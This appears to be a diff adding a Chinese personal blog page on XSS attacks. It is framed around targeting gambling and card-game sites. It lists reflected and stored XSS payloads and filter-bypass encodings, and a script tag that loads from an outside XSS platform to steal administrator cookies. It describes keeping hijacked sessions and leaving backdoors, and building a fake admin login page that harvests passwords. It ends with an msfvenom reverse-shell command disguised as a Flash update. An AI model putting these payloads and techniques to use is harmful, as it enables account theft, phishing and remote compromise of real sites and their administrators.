@@ -1,0 +1,478 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || xss漏洞</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>xss<hanla></hanla>漏洞 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/10/1
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/xss漏洞">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                xss<hanla></hanla>漏洞
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p><hanla></hanla>存在<hanla></hanla>xss<hanla></hanla>漏洞站点：</p>
+<span id="more"></span>
+<p>bc  qp<br><hanla></hanla>测该管理员经常上线的站点</p>
+<h2 id="认识xss"><a href="#认识xss" class="headerlink" title="认识xss"></a><hanla></hanla>认识<hanla></hanla>xss</h2><p><hanla></hanla>XSS（cross-site script）跨站脚本自<hanla></hanla>1996<hanla></hanla>年诞生以来，一直被<hanla></hanla>OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把<hanla></hanla>xss<hanla></hanla>当做新型的<hanla></hanla>“缓冲区溢出攻击”，而<hanla></hanla>JavaScript<hanla></hanla>是新型的<hanla></hanla>shellcode。<br><hanla></hanla>2011<hanla></hanla>年<hanla></hanla>6<hanla></hanla>月份，国内最火的信息发布平台<hanla></hanla>“新浪微博”<hanla></hanla>爆发了<hanla></hanla>xss<hanla></hanla>蠕虫攻击，仅持续<hanla></hanla>16<hanla></hanla>分钟，感染用户近<hanla></hanla>33000<hanla></hanla>个，危害十分严重。<br><hanla></hanla>xss<hanla></hanla>最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。</p>
+<p>借助社工  让管理员登录后台触发漏洞<br><hanla></hanla>cookie<hanla></hanla>盗取  欺骗管理份登录后台</p>
+<h3 id="什么是跨站脚本"><a href="#什么是跨站脚本" class="headerlink" title="什么是跨站脚本"></a>什么是跨站脚本</h3><p><hanla></hanla>是一种经常出现在<hanla></hanla>web<hanla></hanla>应用程序中的计算机安全漏洞，是由于<hanla></hanla>web<hanla></hanla>应用程序对用户的输入过滤不严而产生的。<br>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，<br><hanla></hanla>对受害用户可能采用<hanla></hanla>cookie<hanla></hanla>资料窃取，会话劫持，钓鱼欺骗等攻击手段<br><hanla></hanla>黑帽<hanla></hanla>seo  js<hanla></hanla>代码<br>快照劫持  页面跳转  蜘蛛劫持  钓鱼  等一系列攻击<br><hanla></hanla>根目录 / 首页  head<hanla></hanla>头标签里面 的<hanla></hanla>script<hanla></hanla>代码<br><hanla></hanla>global.asa</p>
+<h3 id="跨站实例"><a href="#跨站实例" class="headerlink" title="跨站实例"></a>跨站实例</h3><pre><code><hanla></hanla>
+xss test
+
+<script>alert("xss")</script>
+
+
+段代码使用<hanla></hanla>alert<hanla></hanla>函数来执行打开一个消息框，
+消息框中显示<hanla></hanla>xss<hanla></hanla>信息
+使用<hanla></hanla>xss<hanla></hanla>弹出恶意警告框，
+代码为：
+<script>alert("xss")</script>
+xss<hanla></hanla>输入也可能是<hanla></hanla>html<hanla></hanla>代码段，如果使网页不停的刷新，代码为
+<meta http-equiv="refresh" content="0;">
+嵌入其他网站链接的代码为：
+<iframe src="http://cracer.com" width="0" height="0"></iframe>
+</code></pre>
+<h3 id="xss危害"><a href="#xss危害" class="headerlink" title="xss危害"></a><hanla></hanla>xss<hanla></hanla>危害</h3><p>网络钓鱼，包括盗取各类的用户账号<br><hanla></hanla>窃取用户<hanla></hanla>cookie<br><hanla></hanla>窃取用户浏览请回话<br>强制弹出广告页面、刷流量<br>网页挂马<br>提升用户权限，进一步渗透网站<br>传播跨站脚本蠕虫等</p>
+<h2 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a><hanla></hanla>xss<hanla></hanla>分类</h2><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a><hanla></hanla>反射型<hanla></hanla>xss</h3><p><hanla></hanla>反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的 ，也是使用最为广泛的一种，<br><hanla></hanla>主要用于将恶意的脚本附加到<hanla></hanla>URL<hanla></hanla>地址的参数中<br>例如</p>
+<pre><code>http://www.cracer.com/search.php?key="&gt;&lt;script&gt;alert("xss")&lt;/script&gt;
+</code></pre>
+<p><hanla></hanla>一般使用的将构造好的<hanla></hanla>URL<hanla></hanla>发给受害者，是受害者点击触发，而且只执行一次，非持久化。</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3gMf"><img src="https://s3.jpg.cm/2021/10/01/Im3gMf.png" alt="Im3gMf.png"></a></p>
+<h3 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a><hanla></hanla>储存型<hanla></hanla>xss</h3><p><hanla></hanla>存储型<hanla></hanla>xss<hanla></hanla>比反射型跨站脚本更具威胁性，<br><hanla></hanla>并且可能影响到<hanla></hanla>web<hanla></hanla>服务器的自身安全。<br><hanla></hanla>此类<hanla></hanla>XSS<hanla></hanla>不需要用户点击特定的<hanla></hanla>URL<hanla></hanla>就能执行跨站脚本，<br><hanla></hanla>攻击者事先讲恶意<hanla></hanla>JavaScript<hanla></hanla>代码上传或存储到漏洞服务器中，<br>只要受害者浏览包含此恶意的代码的页面就会执行恶意代码。</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3BuH"><img src="https://s3.jpg.cm/2021/10/01/Im3BuH.png" alt="Im3BuH.png"></a></p>
+<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a><hanla></hanla>DOM<hanla></hanla>型<hanla></hanla>xss</h3><p><hanla></hanla>攻击模型和反射型<hanla></hanla>xss<hanla></hanla>类型<br>挖掘：<br>通过审查元素追踪触发代码的节点，通过闭合构造攻击语句</p>
+<h2 id="xss漏洞挖掘"><a href="#xss漏洞挖掘" class="headerlink" title="xss漏洞挖掘"></a><hanla></hanla>xss<hanla></hanla>漏洞挖掘</h2><p>手工挖掘<br>我们得到一个站点<br><a target="_blank" rel="noopener" href="http://www.cracer.com/xss.php?id=1"><hanla></hanla>http://www.cracer.com/xss.php?id=1</a><br><hanla></hanla>攻击者会这样进行<hanla></hanla>XSS 测试，<br><hanla></hanla>将如下<hanla></hanla>payloads 分别添加到<hanla></hanla>id=1：<br>可以测试用户输入地方、文件上传地方、<br><hanla></hanla>flash<hanla></hanla>等<br>闭合标签</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+'"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img/src=@ onerror=alert(1)/&gt;
+'"&gt;&lt;img/src=@ onerror=alert(1)/&gt;
+</code></pre>
+<p>在闭合标签的时候要注意闭合优先策略<br>这些标签都是闭合优先级高于双引号完整性优先级的特殊标签。</p>
+<pre><code>&lt;!--
+&lt;iframe&gt;
+&lt;noframes&gt;
+&lt;noscript&gt;
+&lt;script&gt;
+&lt;style&gt;
+&lt;textarea&gt;
+&lt;title&gt;
+&lt;xmp&gt;
+</code></pre>
+<p>工具挖掘<br><hanla></hanla>awvs<br>appscan<br>burp<br>xsser<br>xsscrapy<br>brutexssr<br>OWASP Xenotix</p>
+<h3 id="1-闭合-注意闭合优先级"><a href="#1-闭合-注意闭合优先级" class="headerlink" title="1.闭合  (注意闭合优先级)"></a><hanla></hanla>1.<hanla></hanla>闭合  (注意闭合优先级)</h3><pre><code>&lt;td&gt;123&lt;/td&gt;&lt;script&gt;alert("xss")&lt;/script&gt;&lt;/td&gt;
+前后台标签不一致：可以通过前台标签推理后台标签
+如果不知道后台标签的情况下，尝试盲闭合
+’“/&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/div&gt;&lt;/li&gt;&lt;/textarea&gt;&lt;script&gt;alert("xss")&lt;/script&gt;
+</code></pre>
+<h3 id="2-长度"><a href="#2-长度" class="headerlink" title="2.长度"></a><hanla></hanla>2.<hanla></hanla>长度</h3><p>长度限制（前台限制，后台限制）<br><hanla></hanla>前台限制 （修改表单长度（maxlength),<hanla></hanla>或者<hanla></hanla>burp<hanla></hanla>抓包修改）<br>如果是后台服务器代码限制长度：这种只能缩短代码<br><hanla></hanla>url<hanla></hanla>短网址</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im34P2"><img src="https://s3.jpg.cm/2021/10/01/Im34P2.png" alt="Im34P2.png"></a></p>
+<pre><code>&lt;sC&lt;x&gt;RiPt/sRC=//t.cn/sluj&gt;&lt;/sc&lt;x&gt;ript&gt;
+</code></pre>
+<p>找它黑名单之外的标签调用<br><hanla></hanla>csp<hanla></hanla>防护<br><hanla></hanla>fram<hanla></hanla>标签过掉<br><hanla></hanla>waf<hanla></hanla>可能拦截具体的关键字，我们可以换<hanla></hanla>img<hanla></hanla>图片标签</p>
+<h3 id="4-位置"><a href="#4-位置" class="headerlink" title="4.位置"></a><hanla></hanla>4.<hanla></hanla>位置</h3><p>你要挖哪个位置：<br>反射型还是存储型：<br>搜索框<br><hanla></hanla>url<hanla></hanla>参数位置<br>挖掘你提交的内容在页面中有回显的地方  </p>
+<p><hanla></hanla>存储型<hanla></hanla>xss<hanla></hanla>存在位置<br>可以写入到数据库中，并且会被调用<br><hanla></hanla>1.<hanla></hanla>留言<br><hanla></hanla>2.<hanla></hanla>注册 （用户名，个人资料，支付宝，微信，备注，留言，银行卡信息）<br><hanla></hanla>3.<hanla></hanla>登录（用户名，client-ip/x-forwarded-for/<hanla></hanla>请求头   管理后台  登录账号    登录日志，  lvyecms3.0<br><hanla></hanla>4.<hanla></hanla>修改资料<hanla></hanla>/<hanla></hanla>提交工单，打款备注， 订餐系统（备注位置）   </p>
+<p><hanla></hanla>xss<hanla></hanla>平台<br><hanla></hanla>我接触使用过三个<hanla></hanla>XSS<hanla></hanla>平台<br><hanla></hanla>1.<hanla></hanla>脚本非常丰富：<a target="_blank" rel="noopener" href="http://www.1oad.com/">http://www.1oad.com</a><br><hanla></hanla>2.<hanla></hanla>简约：<a target="_blank" rel="noopener" href="https://xsspt.com/">https://xsspt.com</a><br><hanla></hanla>3.<hanla></hanla>非常好用，自带模块成功获取到了内网<hanla></hanla>ip(上面两个都没有成功)：<a target="_blank" rel="noopener" href="https://xsshs.cn/">https://xsshs.cn</a>  </p>
+<p><hanla></hanla>自己搭建<hanla></hanla>xss<hanla></hanla>平台教程<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/390067540"><hanla></hanla>https://zhuanlan.zhihu.com/p/390067540</a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3fBL"><img src="https://s3.jpg.cm/2021/10/01/Im3fBL.png" alt="Im3fBL.png"></a></p>
+<h3 id="3-代码的防护与绕过"><a href="#3-代码的防护与绕过" class="headerlink" title="3.代码的防护与绕过"></a><hanla></hanla>3.<hanla></hanla>代码的防护与绕过</h3><p><hanla></hanla>$x=preg_replace(“/script/”,””,$x);<br>$x=preg_replace(“/script/i”,””,$x);<br>$x=preg_replace(“/alert/i”,””,$x);<br>$x=preg_replace(“/script/i”,””,$x);<br>preg_replace&nbsp;—&nbsp;执行一个正则表达式的搜索和替换</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><pre><code><hanla></hanla>1、绕过 magic_quotes_gpc        
+magic_quotes_gpc=ON<hanla></hanla>是<hanla></hanla>php<hanla></hanla>中的安全设置，开启后会把一些特殊字符进行轮换，
+比如'(单引号)<hanla></hanla>转换为\'，"(双引号)<hanla></hanla>转换为\" ，\转换为\\
+比如：
+<script>alert("xss");</script><hanla></hanla>会转换为<hanla></hanla><script>alert(\"xss\");</script>,<hanla></hanla>这样我们的<hanla></hanla>xss<hanla></hanla>就不生效了。
+针对开启了<hanla></hanla>magic_quotes_gpc<hanla></hanla>的网站，我们可以通过<hanla></hanla>javascript<hanla></hanla>中的<hanla></hanla>String.fromCharCode<hanla></hanla>方法来绕过，
+我们可以把<hanla></hanla>alert("XSS");转换为
+String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41)
+那么我们的<hanla></hanla>XSS<hanla></hanla>语句就变成了
+<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)
+</script> 
+String.fromCharCode()<hanla></hanla>是<hanla></hanla>javascript<hanla></hanla>中的字符串方法，用来把<hanla></hanla>ASCII<hanla></hanla>转换为字符串。
+2、编码                
+3、改变大小写
+在测试过程中，我们可以改变测试语句的大小写来绕过<hanla></hanla>XSS<hanla></hanla>规则
+
+比如：<script>alert("xss");</script> 可以转换为：
+
+<script>ALeRt("XSS");</script>
+
+4.xss<hanla></hanla>尖括号绕过
+* 一般情况下如果输出没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，
+则可以结合上下标签进行绕过
+  * 事件函数  
+    
+* 常用的一些事件函数     
+    
+  * `onerror`、`onmouseover`、`onload` 等（但是这里依然需要有 `&lt;、&gt;、=` 等符号，只能是在 `script` 才过滤）
+        
+ <img src="x" onerror="alert(/1/)">
+         
+<p onmouseover="alert(/1/)">xxx</p>
+        
+ 
+        
+ 
+  
+* `style` 与 `expression`  
+    *
+ 通过标签的 `style` 样式进行跨站（`IE`）  
+       
+<div style="width:expression(alert('1'));">
+  
+* JavaScript 伪协议
+    * IE
+       <img src="javascript:alert('1')">
+5.<hanla></hanla>括号绕过
+* 外部文件
+  * 很多时候不仅仅是需要得到 `Cookie` 等，
+还需要传播（`XSS` 蠕虫）
+  * 通过 `src` 引入外部文件，
+利用代码写在外部文件中（外部文件后缀可以不为 `.js`）
+  
+* 也可以绕过长度限制
+     
+<script src="1.js"></script>
+* `hex`、`dec` 编码
+  
+* 利用十六进制、十进制进行编码
+     
+<div style="width:expression(alert('1'))">1</div>
+<div style="width:expr
+;ession(alert('1'))">1</div>
+
+
+6.xss<hanla></hanla>编码
+http://tool.chinaz.com/tools/htmlencode.aspx
+xss<hanla></hanla>常用的编码
+第一个，html<hanla></hanla>实体编码，
+例如：alert()
+第二个，进制类，
+例如：\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60，某些时候，也有不带<hanla></hanla>x,<hanla></hanla>例如：\5c\6a
+第三个，Unicode，
+例如：\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060
+第四个，
+纯转义，例如：\'   \"   \&lt;   \&gt; ,<hanla></hanla>这样的在特殊字符前加\进行转义。
+这里可以用    toolmao.com/381.html
+将我们需要插入的值进行编码
+</div></code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3w3W"><img src="https://s3.jpg.cm/2021/10/01/Im3w3W.png" alt="Im3w3W.png"></a></p>
+<h4 id="编码使用"><a href="#编码使用" class="headerlink" title="编码使用"></a>编码使用</h4><p><hanla></hanla>html<hanla></hanla>标签中：<br><hanla></hanla>html<hanla></hanla>中当然会支持<hanla></hanla>html<hanla></hanla>实体编码，例如<hanla></hanla>=，也有<hanla></hanla>&lt;<br><hanla></hanla>支持十六进制，但是要以<hanla></hanla>&amp;#x<hanla></hanla>开头，其中<hanla></hanla>x<hanla></hanla>大写小写无所谓。<br><hanla></hanla>支持十进制，要以<hanla></hanla>&amp;#开头，注意，没有<hanla></hanla>x<hanla></hanla>哦。<br><hanla></hanla>支持数字部分高位补充<hanla></hanla>0，例如<hanla></hanla>=，=<hanla></hanla>这两是一样的。<br>可能你已经发现了，后缀有没有;&nbsp;&nbsp;都无所谓</p>
+<p><hanla></hanla>在对<hanla></hanla>html<hanla></hanla>实体编码应该只编值</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im308U"><img src="https://s3.jpg.cm/2021/10/01/Im308U.png" alt="Im308U.png"></a></p>
+<p><hanla></hanla>xss<hanla></hanla>编码使用</p>
+<pre><code><hanla></hanla>javascript<hanla></hanla>中：
+eval<hanla></hanla>函数里，支持十六进制，但是要以 \x 开头，x<hanla></hanla>只能小写！必须两位，例如：\x5c
+eval<hanla></hanla>函数里，支持八进制，但是要以 \ 开头。必须两位，例如：\134
+eval<hanla></hanla>函数里，还支持\u<hanla></hanla>前缀的<hanla></hanla>unicode，本质是：16<hanla></hanla>进制的<hanla></hanla>ascii<hanla></hanla>码。必须是四位，例如：\u005c
+注意了，这个可和<hanla></hanla>html<hanla></hanla>实体编码不一样，对格式比较严格，不能随便在数字部分补充<hanla></hanla>0。
+执行十六进制字符串，alert(1)<hanla></hanla>转十六进制<hanla></hanla>616c657274283129
+Js<hanla></hanla>中需要<hanla></hanla>/x<hanla></hanla>开头，
+俩位字符\x61\x6C\x65\x72\x74\x28\x31\x29
+Payload：
+<img src="x" onerror="eval(&quot;\x61\x6C\x65\x72\x74\x28\x31\x29&quot;)">
+</code></pre>
+<p>编码绕过实例</p>
+<pre><code><hanla></hanla>JS<hanla></hanla>代码中并没有出现尖括号，可是运行时却输出了尖括号！！！这意味着：
+可以通过\u003c<hanla></hanla>和\u003e<hanla></hanla>来代替<hanla></hanla>&lt;和&gt;。可是该如何利用这个特性来构造<hanla></hanla>XSS<hanla></hanla>攻击呢？继续看一个例子： 
+<div id="s"> 
+test 
+</div> 
+<script> 
+    var s = "\u003cimg src=1 onerror=alert(/xss/)\u003e"; 
+    document.getElementById('s').innerHTML = s; 
+</script>
+</code></pre>
+<p><hanla></hanla>js<hanla></hanla>代码加密<br><hanla></hanla>js<hanla></hanla>混淆加密</p>
+<p><hanla></hanla>cookie<hanla></hanla>盗取<br><hanla></hanla>反射型<hanla></hanla>XSS<hanla></hanla>的<hanla></hanla>cookie<hanla></hanla>获取<br><hanla></hanla>存储型<hanla></hanla>XSS<hanla></hanla>的<hanla></hanla>cookie<hanla></hanla>获取<br><hanla></hanla>Xss<hanla></hanla>其他模块使用<br><hanla></hanla>保持<hanla></hanla>cookie<hanla></hanla>长久性<br><hanla></hanla>建立<hanla></hanla>sessin<hanla></hanla>会话控制<br><hanla></hanla>beef-xss<hanla></hanla>使用介绍<br>注意代码长度问题：<br><hanla></hanla>可以使用<hanla></hanla>url<hanla></hanla>短网址转换</p>
+<h3 id="存储型盗取cookie"><a href="#存储型盗取cookie" class="headerlink" title="存储型盗取cookie"></a><hanla></hanla>存储型盗取<hanla></hanla>cookie</h3><p><hanla></hanla>首先我们在可能存在<hanla></hanla>xss<hanla></hanla>的地方插入代码</p>
+<pre><code>"&gt;&lt;sCRiPt sRC=//xss8.cc/uIgE&gt;&lt;/sCrIpT&gt;
+</code></pre>
+<p><hanla></hanla>然后等待管理员登录，然后管理员点击等审留言<hanla></hanla>cookie<hanla></hanla>就会过来</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im32kO"><img src="https://s3.jpg.cm/2021/10/01/Im32kO.png" alt="Im32kO.png"></a></p>
+<p><hanla></hanla>在<hanla></hanla>xss<hanla></hanla>平台查看，当然啦我这里盗取失败了，因为后台点不了等审留言</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im339w"><img src="https://s3.jpg.cm/2021/10/01/Im339w.png" alt="Im339w.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3KQ8"><img src="https://s3.jpg.cm/2021/10/01/Im3KQ8.png" alt="Im3KQ8.png"></a></p>
+<h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>需要管理员在线状态，去访问我们发的链接<br>一般我们可以发一个页面，链接一访问就会跳转<br><hanla></hanla>其实能钓鱼 就可以直接插入一段<hanla></hanla>beef<hanla></hanla>代码能盗取所有浏览器的<hanla></hanla>coolkie<br>owasp xss  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3hSi"><img src="https://s3.jpg.cm/2021/10/01/Im3hSi.png" alt="Im3hSi.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3D8C"><img src="https://s3.jpg.cm/2021/10/01/Im3D8C.png" alt="Im3D8C.png"></a></p>
+<p><hanla></hanla>旅烨<hanla></hanla>cms<hanla></hanla>用户名登录<hanla></hanla>xss</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3iO5"><img src="https://s3.jpg.cm/2021/10/01/Im3iO5.png" alt="Im3iO5.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3aBr"><img src="https://s3.jpg.cm/2021/10/01/Im3aBr.png" alt="Im3aBr.png"></a></p>
+<h4 id="xss其他模块使用"><a href="#xss其他模块使用" class="headerlink" title="xss其他模块使用"></a><hanla></hanla>xss<hanla></hanla>其他模块使用</h4><p><hanla></hanla>图片标签成功打<hanla></hanla>cookie<hanla></hanla>的成功率也很高<br><hanla></hanla>还可以利用<hanla></hanla>xss<hanla></hanla>平台实现各种功能<br>如键盘获取</p>
+<h4 id="保持长久会话session"><a href="#保持长久会话session" class="headerlink" title="保持长久会话session"></a><hanla></hanla>保持长久会话<hanla></hanla>session</h4><p>cookie 有效期<br><hanla></hanla>7 天  一个月<br><hanla></hanla>修改了密码 cookie<hanla></hanla>失效<br>进入后台</p>
+<p><hanla></hanla>改了密码<hanla></hanla>cookie<hanla></hanla>失效<br><hanla></hanla>把<hanla></hanla>cookie 变成<hanla></hanla>session<br><hanla></hanla>保持<hanla></hanla>session 不退出后台<hanla></hanla>session 一直有效<br><hanla></hanla>安全狗  之类<hanla></hanla>waf 强制<hanla></hanla>30<hanla></hanla>分钟重新登录</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3Tuy"><img src="https://s3.jpg.cm/2021/10/01/Im3Tuy.png" alt="Im3Tuy.png"></a></p>
+<p>用鼠标录制器一直点</p>
+<p>admin/index.asp<br><hanla></hanla>留长久的后门</p>
+<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p><hanla></hanla>http-only 只读<hanla></hanla>cookie<br>awvs 如果没启用 中危漏洞<br>管理员后台 </p>
+<p>cookie: 没用或者为空<br><hanla></hanla>启用了<hanla></hanla>http-only  没法获取<hanla></hanla>cookie<br><hanla></hanla>1.<hanla></hanla>钓鱼-通过伪造管理员后台-盗取管理员账号<br><hanla></hanla>假设对方开启了<hanla></hanla>http-only，xss<hanla></hanla>平台没有获取到<hanla></hanla>cookie<hanla></hanla>但是获取到了后台登录地址<br><a target="_blank" rel="noopener" href="http://192.168.43.10:9030/admin/ad_login.asp"><hanla></hanla>http://192.168.43.10:9030/admin/ad_login.asp</a><br>apt-get install httrack    </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im39Re"><img src="https://s3.jpg.cm/2021/10/01/Im39Re.png" alt="Im39Re.png"></a></p>
+<p><hanla></hanla>复制<hanla></hanla>123<hanla></hanla>中的三个文件，本地搭建，</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3Mmt"><img src="https://s3.jpg.cm/2021/10/01/Im3Mmt.png" alt="Im3Mmt.png"></a></p>
+<p><hanla></hanla>需要用到<hanla></hanla>index.php<hanla></hanla>和<hanla></hanla>tz.php<br><hanla></hanla>在<hanla></hanla>index.php<hanla></hanla>是用来接受提交的参数的，所有我们要把提交过来的参数传到数据库</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im3OTR"><img src="https://s3.jpg.cm/2021/10/01/Im3OTR.png" alt="Im3OTR.png"></a></p>
+<p><hanla></hanla>在我们<hanla></hanla>ad_login.html<hanla></hanla>里面要把我们的表单<hanla></hanla>form  提交<hanla></hanla>action<hanla></hanla>给<hanla></hanla>index.php<br><hanla></hanla>因为<hanla></hanla>index.php<hanla></hanla>和数据库接受的 都是<hanla></hanla>password<hanla></hanla>所有我们要把提交的<hanla></hanla>name<hanla></hanla>改为<hanla></hanla>password</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCGQz"><img src="https://s3.jpg.cm/2021/10/01/ImCGQz.png" alt="ImCGQz.png"></a></p>
+<p><hanla></hanla>还有一个<hanla></hanla>tz.php<hanla></hanla>就是把我们获取成功后跳转到正确的后台地址</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCIYu"><img src="https://s3.jpg.cm/2021/10/01/ImCIYu.png" alt="ImCIYu.png"></a></p>
+<p><hanla></hanla>然后我们在本地测试，登录<hanla></hanla>127.0.0.1/ad_login.html，输入密码之后跳转到了后台<br>然后数据库也收到了管理员的账号和密</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCLCG"><img src="https://s3.jpg.cm/2021/10/01/ImCLCG.png" alt="ImCLCG.png"></a></p>
+<p><hanla></hanla>然后我们配合<hanla></hanla>xss<hanla></hanla>来进行钓鱼，删除一下数据库里面的数据<br><hanla></hanla>delete from admin where username=’admin’;<br><hanla></hanla>这时候在利用<hanla></hanla>xss<hanla></hanla>漏洞就可以这样写  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCq1X"><img src="https://s3.jpg.cm/2021/10/01/ImCq1X.png" alt="ImCq1X.png"></a></p>
+<p>登录后台点击待审留言的时候就会进入我们构造好的钓鱼页面<br><hanla></hanla>可是这里有个<hanla></hanla>bug，管理员一点就要登录，无限循环<br><hanla></hanla>但是也可以用<hanla></hanla>xss<hanla></hanla>平台，创建一个自定义项目，数据库获取到密码之后，我们就把<br>我们的钓鱼代码删掉，对面在访问等审留言，就不会一直跳了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImC7A6"><img src="https://s3.jpg.cm/2021/10/01/ImC7A6.png" alt="ImC7A6.png"></a></p>
+<h3 id="2-钓鱼-合成flash-更新升级exe程序来获取管理员pc权限"><a href="#2-钓鱼-合成flash-更新升级exe程序来获取管理员pc权限" class="headerlink" title="2.钓鱼-合成flash-更新升级exe程序来获取管理员pc权限"></a><hanla></hanla>2.<hanla></hanla>钓鱼-合成<hanla></hanla>flash-更新升级<hanla></hanla>exe<hanla></hanla>程序来获取管理员<hanla></hanla>pc<hanla></hanla>权限</h3><p><hanla></hanla>下载<hanla></hanla>flash<hanla></hanla>升级页面（免杀和伪造）<br><hanla></hanla>先生成一个<hanla></hanla>payload<br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.153 lport=1122 -f exe &gt; /root/f.exe</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCRR4"><img src="https://s3.jpg.cm/2021/10/01/ImCRR4.png" alt="ImCRR4.png"></a></p>
+<p><hanla></hanla>然后打开一个监听，真实情况的话，生成的木马地址应该写<hanla></hanla>ngrok<hanla></hanla>的，监听写本地的，</p>
